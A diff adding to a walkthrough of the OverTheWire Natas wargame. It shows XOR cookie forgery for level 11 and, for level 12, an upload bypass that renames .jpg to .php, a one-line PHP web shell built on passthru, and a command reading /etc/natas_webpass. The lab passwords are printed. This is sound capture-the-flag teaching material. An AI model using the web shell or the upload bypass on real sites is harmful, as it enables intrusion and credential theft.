@@ -617,4 +617,141 @@ echo $decripted_key;
 
 Note that we modified the key to be the JSON encoded value array!
 Running this will print `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`, notice the pattern? 
-`qw8J` is the key! And now we can use it to encrypt the 
+`qw8J` is the key! And now we can use it to encrypt the fake cookie!
+
+However, we don't yet know what to set show password to, logically it would be "yes" but we need to confirm.
+Turns out that bellow, in the form there's a little PHP script:
+
+```php
+<?
+if($data["showpassword"] == "yes") {
+    print "The password for natas12 is <censored><br>";
+}
+?>
+```
+
+So now we can build our cookie and encrypt it!
+Taking the code from before and making some changes.
+
+```php
+<?php
+function xor_encrypt() {
+    $key = "qw8J";
+    $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+echo base64_encode(xor_encrypt());
+?>
+```
+
+From which we get `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`, 
+we change the cookie, refresh the page and get:
+
+```html
+<div id="content">
+
+Cookies are protected with XOR encryption<br><br>
+
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+```
+
+# Level 12
+
+Arriving to Level 12 we have before us an uploading utility supporting a suspisciously small image size.
+
+Going to the source code we find:
+
+```php
+<? 
+function genRandomString() {
+    $length = 10;
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+    $string = "";    
+
+    for ($p = 0; $p < $length; $p++) {
+        $string .= $characters[mt_rand(0, strlen($characters)-1)];
+    }
+
+    return $string;
+}
+
+function makeRandomPath($dir, $ext) {
+    do {
+        $path = $dir."/".genRandomString().".".$ext;
+    } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+} else {
+?>
+    <form enctype="multipart/form-data" action="index.php" method="POST">
+    <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+    <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
+    Choose a JPEG to upload (max 1KB):<br/>
+    <input name="uploadedfile" type="file" /><br />
+    <input type="submit" value="Upload File" />
+    </form>
+<? } ?> 
+```
+
+Upon inspection, all functions only generate random names, the interesting part starts with the `if`, with a quick analysis we can see that it:
+  
+  - Checks if `filename` is present in the request
+    - Checks if the file size
+        - Tries to move the file to it's final location
+  - If the `filename` is not present, it generates a filename for the future upload and appends `.jpg` to it!
+
+So lets try to upload a PHP script, but before, lets change that `.jpg` to `.php`, otherwise the server will try to read it as a JPEG.
+
+```html
+<input type="hidden" name="filename" value="6jhtalz54t.jpg"> 
+```
+
+Becomes (your filename is probably different):
+
+```html
+<input type="hidden" name="filename" value="6jhtalz54t.php"> 
+```
+
+Moving on to the script, we already know from experience that `passthru` lets us execute commands on the system,
+we will use it with [`$_REQUEST`](https://www.php.net/manual/en/reserved.variables.request.php) in order to gain a shell like access through a query parameter.
+
+```php
+<?php echo passthru($_REQUEST["cmd"]); ?>
+```
+
+One line of PHP does the trick, no need to get fancy.
+Now, when you upload your PHP you can use `cmd` to run a command and get the result displayed!
+
+Like:
+```bash
+?cmd=ls # will print the directory contents
+```
+
+So our command will be the always loyal `cat /etc/natas_webpass/natas13`, 
+running `http://natas12.natas.labs.overthewire.org/upload/6jhtalz54t.php?cmd=cat /etc/natas_webpass/natas13` will get you the password `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`!
+
